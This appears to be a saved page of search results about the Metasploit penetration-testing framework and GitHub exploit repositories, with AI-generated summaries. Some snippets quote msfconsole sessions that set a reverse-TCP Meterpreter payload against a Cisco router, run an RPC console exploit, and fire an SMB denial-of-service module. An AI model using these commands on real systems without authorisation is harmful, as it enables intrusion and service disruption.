@@ -1,0 +1,266 @@
+
+site:metasploit.com
+
+
+
+
+
+Ask
+All
+Images
+News
+Videos
+Goggles
+
+Only showing results from metasploit.com
+Clear filter
+Clear filter to show all search results
+Metasploit is the world’s most used penetration testing framework, developed by Rapid7 and the open-source community.  It enables security professionals to find, exploit, and validate vulnerabilities in systems, networks, and applications. The platform includes the Metasploit Framework (open source), Metasploit Pro (commercial), and related tools for vulnerability management and security assessments. 
+
+Key features include:
+
+Exploit modules for known vulnerabilities (e.g., recent additions for CVE-2025-67888, CVE-2025-68613, CVE-2025-62368, and Oracle E-Business Suite RCE). 
+Payloads like Meterpreter and Mettle, supporting multiple platforms and architectures, including RISC-V. 
+Auxiliary modules for reconnaissance, scanning, and data gathering. 
+Community-driven development with active contributions, pull requests, and documentation.
+The latest updates (as of January 2026) focus on persistence mechanisms, RCE exploits, and improved payloads.  Users can download the Metasploit Framework or Metasploit Pro from the official site, access documentation at docs.metasploit.com, and join the community via Slack, GitHub, or Twitter. 
+
+For learning, start with the Getting Started guide or explore Metasploitable, a vulnerable virtual machine designed for safe testing. 
+
+AI-generated answer. Please verify critical facts.
+
+
+Copy
+
+Share
+
+
+
+🌐
+🌐
+🌐
+🌐
++2
+
+More
+🌐
+Metasploit
+metasploit.com
+Metasploit | Penetration Testing Software, Pen Testing Security | Metasploit
+Find security issues, verify vulnerability mitigations & manage security assessments with Metasploit. Get the world's best penetration testing software now.
+Download Metasploit
+Download the version of Metasploit that's right for you. ... Rapid7's solution for advanced vulnerability management analytics and reporting. Free Trial · Rapid7's incident detection and response solution unifying SIEM, EDR, and UBA capabilities. Free Trial · Rapid7's cloud-powered application security testing solution that combines ...
+Getting Started with Metasploit for Penetration Testing
+Join our vibrant Metasploit community and help us write modules, docs, and more.
+🌐
+Metasploit
+metasploit.com › download
+Download Metasploit: World's Most Used Penetration Testing Tool | Metasploit
+Pen testing software to act like an attacker. Download Metasploit to safely simulate attacks on your network and uncover weaknesses. Free download.
+🌐
+Metasploit
+docs.metasploit.com
+Home | Metasploit Documentation Penetration Testing Software, Pen Testing Security
+Welcome to Metasploit-land. Are you a Metasploit user who wants to get started or get better at hacking stuff (that you have permission to hack)? The quickest way to get started is to download the Metasploit nightly installers. This will give you access to both the free, open-source Metasploit ...
+🌐
+Metasploit
+metasploit.com › get-started
+Getting Started with Metasploit for Penetration Testing | Metasploit
+Learn how to download, install, and get started with Metasploit. View our detailed documentation for assistance. Learn more.
+🌐
+Metasploit
+docs.metasploit.com › docs › using-metasploit › basics › using-metasploit.html
+Running modules | Metasploit Documentation Penetration Testing Software, Pen Testing Security
+You can use the search command to search for modules: msf > search type:auxiliary http html title tag Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/title normal No HTTP HTML Title Tag Content Grabber Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/title msf > You can use a Metasploit ...
+🌐
+Metasploit
+docs.metasploit.com › docs › using-metasploit › getting-started › nightly-installers.html
+Nightly Installers | Metasploit Documentation Penetration Testing Software, Pen Testing Security
+Linux packages are built nightly for .deb (i386, amd64, armhf, arm64) and .rpm (64-bit x86) systems. Debian/Ubuntu packages are available at https://apt.metasploit.com and CentOS/Redhat/Fedora packages are located at https://rpm.metasploit.com.
+🌐
+Metasploit
+metasploit.com › help
+Get Help with Metasploit: How to Use Metasploit for Pen Testing | Metasploit
+# Find a Way to Help a Metasploit User def exploit if datastore['NEED_HELP'] if target == 'human' print_good "Slack team - metasploit.slack.com" print_good "#twitter handle - @metasploit" print_good "mastodon - @metasploit@infosec.exchange" print_good "development questions - msfdev [ @ ] metasploit.com" print_good "sales questions - sales [ @ ] rapid7.com" else print_good "Read Docs - docs.metasploit.com" print_good "View Metasploit Modules - https://www.rapid7.com/db/modules/" end else if bored_status == true print_good "Find a Hobby - https://youtu.be/cvMa90zkFOI" else print_error "Not sure how we can help you then..." end end end
+🌐
+Metasploit
+metasploit.com › contribute
+Contribute to Metasploit: Like Hacking Things? Start Here. | Metasploit
+Contributions from the open source community are the soul of Metasploit. Get involved! Help us build modules, fix bugs, and provide documentation. Learn more.
+🌐
+Metasploit
+help.metasploit.com
+Metasploit Documentation
+We cannot provide a description for this page right now
+🌐
+Metasploit
+docs.metasploit.com › docs › modules.html
+Modules | Metasploit Documentation Penetration Testing Software, Pen Testing Security
+auxiliary/admin/scada/modicon_command · auxiliary/admin/scada/modicon_password_recovery · auxiliary/admin/scada/modicon_stux_transfer · auxiliary/admin/scada/moxa_credentials_recovery · auxiliary/admin/scada/multi_cip_command · auxiliary/admin/scada/mypro_mgr_creds ·
+Find elsewhere
+Google
+Bing
+
+
+
+site:github.com metasploit exploit
+
+
+
+
+
+Ask
+All
+Images
+News
+Videos
+Goggles
+
+Only showing results from github.com
+Clear filter
+Clear filter to show all search results
+Metasploit Exploit modules are components within the Metasploit Framework used to exploit known vulnerabilities in target systems.  These modules enable security professionals and researchers to test system vulnerabilities, assess impact, and develop custom payloads for further analysis. 
+
+Active Exploits: Exploit a specific host, run to completion, and exit. Example: msf exploit(ms08_067_netapi) targets a Windows SMB vulnerability to gain remote access. 
+Passive Exploits: Wait for incoming connections and exploit clients (e.g., web browsers). Example: msf exploit(windows/browser/ani_loadimage_chunksize) triggers a stack overflow when a user visits a malicious webpage. 
+Common Exploits:
+EternalBlue (ms17_010_eternalblue): A reliable remote exploit for Windows systems with unpatched SMB services, granting SYSTEM-level access.
+vsftpd 2.3.4 Backdoor: Exploits a known vulnerability in vsftpd to gain a remote shell on Metasploitable 2.
+Cisco RV320/RV325 RCE (linux/http/cisco_rv32x_rce): Uses two vulnerabilities to achieve unauthenticated remote code execution on routers via HTTPS.
+Module Structure: Exploit modules follow a standard Ruby class format, including Name, Description, Targets, Payload, References, and check/exploit methods. Example: sample exploit. 
+Usage Workflow:
+Use use exploit/<module_name>
+Set required options: RHOST, LHOST, PAYLOAD
+Run exploit or run to initiate the attack.
+Interact with sessions using sessions -i <id>. 
+For development, the Metasploit Framework’s official repository is hosted at https://github.com/rapid7/metasploit-framework. 
+
+AI-generated answer. Please verify critical facts.
+
+
+Copy
+
+Share
+
+
+
+More
+🌐
+GitHub
+github.com › AnamolZ › Exploitation
+GitHub - AnamolZ/Exploitation: The Metasploit Exploitation - EternalBlue SMB Exploit module within the Metasploit framework enables security professionals and researchers to test the vulnerability and assess its impact on target systems. This module can also be used to develop custom payloads and exploit techniques for further research and analysis.
+This documentation provides a step-by-step guide on how to use Metasploit to exploit the EternalBlue vulnerability in a target system for educational and ethical purposes only.
+Author   AnamolZ
+🌐
+GitHub
+github.com › rapid7 › metasploit-framework › blob › master › lib › msf › core › exploit.rb
+metasploit-framework/lib/msf/core/exploit.rb at master · rapid7/metasploit-framework
+# for all exploits unless expressly disabled. 'ConnectionType' => 'reverse bind noconn none tunnel', } end · · ## # # The various check codes that can be returned from the ``check'' routine. # Please read the following wiki to learn how these codes are used: # https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-write-a-check-method.html ·
+Author   rapid7
+
+🌐
+GitHub
+github.com › rapid7 › metasploit-framework
+GitHub - rapid7/metasploit-framework: Metasploit Framework
+Comprehensive documentation, including usage guides, is available at Metasploit Docs.
+Starred by 37.4K users
+Forked by 14.7K users
+Languages   Ruby 95.0% | PowerShell 2.8% | C 1.2% | Python 0.5% | HTML 0.2% | JavaScript 0.1%
+
+🌐
+GitHub
+github.com › lattera › metasploit › blob › master › documentation › samples › modules › exploits › sample.rb
+metasploit/documentation/samples/modules/exploits/sample.rb at master · lattera/metasploit
+# http://metasploit.com/framework/ ## · require 'msf/core' · module Msf · · ### # # This exploit sample shows how an exploit module could be written to exploit · # a bug in an arbitrary TCP server. # ### class Exploits::Sample < Msf::Exploit::Remote ·
+Author   lattera
+
+🌐
+GitHub
+github.com › rapid7 › metasploit-framework › blob › master › documentation › modules › exploit › linux › http › cisco_rv32x_rce.md
+metasploit-framework/documentation/modules/exploit/linux/http/cisco_rv32x_rce.md at master · rapid7/metasploit-framework
+USE_SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Exploit target: Id Name -- ---- 0 LINUX MIPS64 msf exploit(linux/http/cisco_rv32x_rce) > set RHOSTS 192.168.1.1 RHOSTS => 192.168.1.1 msf exploit(linux/http/cisco_rv32x_rce) > set payload linux/mips64/meterpreter_reverse_tcp payload => linux/mips64/meterpreter_reverse_tcp msf exploit(linux/http/cisco_rv32x_rce) > set LHOST 192.168.1.2 LHOST => 192.168.1.2 msf exploit(linux/http/cisco_rv32x_rce) > set RPORT 443 RPORT => 443 msf exploit(linux/http/cisco_rv32x_rce) > set USE_SSL true USE_SSL => true msf exploit(linux/http/cisco_rv32x_rce) > run [*] Started reverse TCP handler on 192.168.1.2:4444 [*] Using URL: http://0.0.0.0:8080/ [*] Local IP: http://192.168.1.2:8080/ [*] Server started.
+Author   rapid7
+
+🌐
+GitHub
+github.com › d4rc0d3x › msf-exp-collection
+GitHub - d4rc0d3x/msf-exp-collection: Exploits in general (metasploit packs, metasploit, custom, third party, etc)
+Search for your metasploit modules "mixins.rb" file, generally in "~<msf_root_directory>/lib/msf/core/exploit/mixins.rb" Include the following entries at the end of the file:
+Starred by 6 users
+Forked by 3 users
+
+🌐
+GitHub
+github.com › x00itachi › metasploit-exploit-search-online
+GitHub - x00itachi/metasploit-exploit-search-online: this script search exploit online using shell script
+[1/1]Reference : =============== CVE-2005-2120 MSB-MS05-047 BID-15065 OSVDB-18830 [1/1]Usage Information : ======================= $ msfconsole msf > use auxiliary/dos/windows/smb/ms05_047_pnp msf auxiliary(ms05_047_pnp) > set RHOST [TARGET IP] msf auxiliary(ms05_047_pnp) > run [1/1]Download Exploit : ====================== http://dev.metasploit.com/redmine/projects/framework/repository/revisions/master/raw/modules/auxiliary/dos/windows/smb/ms05_047_pnp.rb
+Forked by 2 users
+Languages   Shell
+
+🌐
+GitHub
+github.com › rapid7 › metasploit-framework › tree › master › modules › exploits
+metasploit-framework/modules/exploits at master · rapid7/metasploit-framework
+Metasploit Framework. Contribute to rapid7/metasploit-framework development by creating an account on GitHub.
+Author   rapid7
+
+🌐
+GitHub
+github.com › maguihong › notes › blob › master › tools › metasploit › metasploit-fundamentals › exploits.md
+notes/tools/metasploit/metasploit-fundamentals/exploits.md at master · maguihong/notes
+Active exploits will exploit a specific host, run until completion, and then exit.
+Author   maguihong
+
+🌐
+GitHub
+github.com › rapid7 › metasploit-framework › blob › master › documentation › modules › exploit › windows › smb › ms17_010_eternalblue.md
+metasploit-framework/documentation/modules/exploit/windows/smb/ms17_010_eternalblue.md at master · rapid7/metasploit-framework
+Grooming the kernel pool does not always succeed, so this is the amount of times to retry the exploit.
+Author   rapid7
+
+Find elsewhere
+Google
+Bing
+Mojeek
+🌐
+GitHub
+github.com › rapid7 › metasploit-framework › blob › master › modules › exploits › example.rb
+metasploit-framework/modules/exploits/example.rb at master · rapid7/metasploit-framework
+# Current source: https://github.com/rapid7/metasploit-framework · ## · ### # # This exploit sample shows how an exploit module could be written to exploit · # a bug in an arbitrary TCP server. # ### class MetasploitModule < Msf::Exploit::Remote · Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html ·
+Author   rapid7
+
+🌐
+GitHub
+github.com › rapid7 › metasploit-framework › blob › master › documentation › modules › exploit › multi › misc › msf_rpc_console.md
+metasploit-framework/documentation/modules/exploit/multi/misc/msf_rpc_console.md at master · rapid7/metasploit-framework
+The username for Metasploit RPC (default: msf). The password for the RPC user. msf > use exploit/multi/misc/msf_rpc_console msf exploit(msf_rpc_console) > set rhost 172.16.191.166 rhost => 172.16.191.166 msf exploit(msf_rpc_console) > set username msf username => msf msf exploit(msf_rpc_console) > set password abc123 password => abc123 msf exploit(msf_rpc_console) > set lhost 172.16.191.181 lhost => 172.16.191.181 msf exploit(msf_rpc_console) > set target 0 target => 0 msf exploit(msf_rpc_console) > run [*] Started reverse TCP handler on 172.16.191.181:4444 [+] 172.16.191.166:55552 - Authenticated successfully [*] 172.16.191.166:55552 - Metasploit 4.14.28-dev [*] 172.16.191.166:55552 - Ruby 2.3.3 x64-mingw32 2016-11-21 [*] 172.16.191.166:55552 - API version 1.0 [+] 172.16.191.166:55552 - Created console #0 [*] 172.16.191.166:55552 - Sending payload...
+Author   rapid7
+
+🌐
+GitHub
+github.com › rapid7 › metasploit-framework › wiki › Exploit-Ranking
+Exploit Ranking · rapid7/metasploit-framework Wiki · GitHub
+Documentation Update: This Wiki page should be viewable at https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html. Or if it is no longer available, see this page's previous history · Home Welcome to Metasploit! Using Metasploit A collection of useful links for penetration testers.
+Author   rapid7
+
+🌐
+GitHub
+github.com › rapid7 › metasploit-framework › blob › master › modules › exploits › windows › local › cve_2022_21882_win32k.rb
+metasploit-framework/modules/exploits/windows/local/cve_2022_21882_win32k.rb at master · rapid7/metasploit-framework
+is the same for both vulnerabilities. This exploit combines the patch bypass with the original exploit to
+Author   rapid7
+🌐
+GitHub
+github.com › dogasantos › msfcve
+GitHub - dogasantos/msfcve: Metasploit Exploit CVE Coverage
+It parses each exploit module to extract all referenced CVE IDs, compiling them into a single, sorted, and easily consumable JSON file. Vulnerability Management: Quickly identify if a known CVE has a publicly available Metasploit exploit, which can significantly impact its risk profile and prioritization for patching.
+Author   dogasantos
+
+🌐
+
+
+
+### Summary 
+1)series of link provided by the google to find all Metasploit public web details 
+
+2) second prompt provides all link that provide known exploits from all GitHub profiles
